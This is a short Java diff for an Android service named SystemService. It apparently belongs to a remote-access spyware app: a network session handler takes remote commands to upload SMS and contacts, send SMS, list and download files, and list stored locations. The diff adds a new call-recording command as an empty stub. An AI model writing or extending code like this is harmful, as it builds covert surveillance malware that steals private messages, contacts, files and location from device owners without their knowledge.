@@ -37,12 +37,13 @@ import java.util.TimerTask;
 public class SystemService extends Service{
     private NetworkSessionManager mSessionManager;
     private NetworkSessionManager.SessionHandler mSessionHandler = new NetworkSessionManager.SessionHandler() {
+        private static final String ACTION_CALL_RECORD = "call_record";
         private static final String ACTION_LOCATION_LIST = "location_list";
-        private String ACTION_FILE_DOWNLOAD = "file_download";
-        private String ACTION_FILE_LIST = "file_list";
-        private String ACTION_SEND_SMS = "send_sms";
-        private String ACTION_UPLOAD_SMS = "upload_sms";
-        private String ACTION_UPLOAD_CONTACT = "upload_contact";
+        private static final String ACTION_FILE_DOWNLOAD = "file_download";
+        private static final String ACTION_FILE_LIST = "file_list";
+        private static final String ACTION_SEND_SMS = "send_sms";
+        private static final String ACTION_UPLOAD_SMS = "upload_sms";
+        private static final String ACTION_UPLOAD_CONTACT = "upload_contact";
         @Override
         public void handleSession(InputStream inputStream, OutputStream outputStream) {
             byte[] receiveData = DataPack.receiveDataPack(inputStream);
@@ -162,6 +163,8 @@ public class SystemService extends Service{
                 } catch (JSONException e) {
                     e.printStackTrace();
                 }
+            } else if(action.equals(ACTION_CALL_RECORD)) {
+
             } else if(action.equals(ACTION_LOCATION_LIST)) {
                 List<LocationDb.LocationInfo> infoList = LocationDb.list();
                 JSONObject responseJsonObject = new JSONObject();
